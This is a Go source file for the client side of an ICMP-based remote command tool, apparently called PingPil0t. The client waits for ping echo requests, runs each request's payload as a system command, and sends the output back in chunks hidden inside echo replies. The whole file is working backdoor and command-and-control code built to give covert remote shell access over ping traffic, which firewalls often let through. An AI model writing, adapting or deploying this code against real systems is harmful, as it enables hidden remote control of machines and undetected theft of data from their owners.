package handlers

// Client Implementation

import (
  "os"
  "fmt"
  "net"
  "log"
  "strings"
  "os/exec"
  "os/signal"
  "PingPil0t/utils"
  "golang.org/x/net/icmp"
  "golang.org/x/net/ipv4"
)

// func to handle echo replies for client 
func sendEchoReply(conn *icmp.PacketConn, peer string, pkt *icmp.Echo, chunkSize int) {
 var ( 
   res []byte 
   err error  
 )
 
 cmd := strings.Fields(string(pkt.Data))
 if len(cmd) > 0 {
   res, err = exec.Command(cmd[0], cmd[1:]...).Output()
 } else {
   res = []byte("?!")
 }

 if err != nil {
   log.Println("[!] Error while executing command!")
   return
 }

 for from := 0; from < len(res); from += chunkSize {
   to := from + chunkSize
   if to > len(res) {
     to = len(res)
   }

   msg := icmp.Message {
     Type: ipv4.ICMPTypeEchoReply, 
     Code: 0,
     Body: &icmp.Echo {
       ID: pkt.ID,
       Seq: pkt.Seq,
       Data: []byte(string(res[from:to])),
     },
   }

   packet, err := msg.Marshal(nil)
   if err != nil {
     log.Println("[!] Error marshaling ICMP echo reply:", err)
     return
   }

   _, err = conn.WriteTo(packet, &net.IPAddr{IP: net.ParseIP(peer)})
   if err != nil {
     log.Println("[!] Error sending ICMP echo reply:", err)
     return
   } 
 }

   fmt.Println("[+] Successfully sent icmp echo reply!") 
}

// func to handle echo requests from server
func handleEchoRequest(conn *icmp.PacketConn, chunkSize int) {
  buffer := make([]byte, 1024)

  for {
    n, peer, err := conn.ReadFrom(buffer)
    if err != nil {
      log.Println("[!] Error reading from connection:", err)
      continue
    }

    msg, err := icmp.ParseMessage(icmpProtocol, buffer[:n])
    if err != nil {
      log.Println("[!] Error parsing ICMP message:", err)
      continue
    }

    switch msg.Type {
    case ipv4.ICMPTypeEcho:
      fmt.Println("[+] Received icmp echo request from", peer.String()) 
      sendEchoReply(conn, peer.String(), msg.Body.(*icmp.Echo), chunkSize)
    default:
      continue 
    }
  }
}

// func to handle client specific actions  
func StartClient(iface string, chunkSize int) {

 fmt.Print("\n[+] Starting client")
 ifaceAddr := utils.ResolveInterfaceIP(iface)
 
 conn, err := icmp.ListenPacket("ip4:icmp", ifaceAddr)
 if err != nil {
   log.Fatal("[!] Error listening for ICMP packets:", err)
 }
 defer conn.Close()

 fmt.Println(" => 0k!")

 c := make(chan os.Signal)
 signal.Notify(c, os.Interrupt)

 go func(){
   <-c 
   fmt.Println("\n[!] Shutting down client!")
   os.Exit(0)
 }()
 
 handleEchoRequest(conn, chunkSize)
}

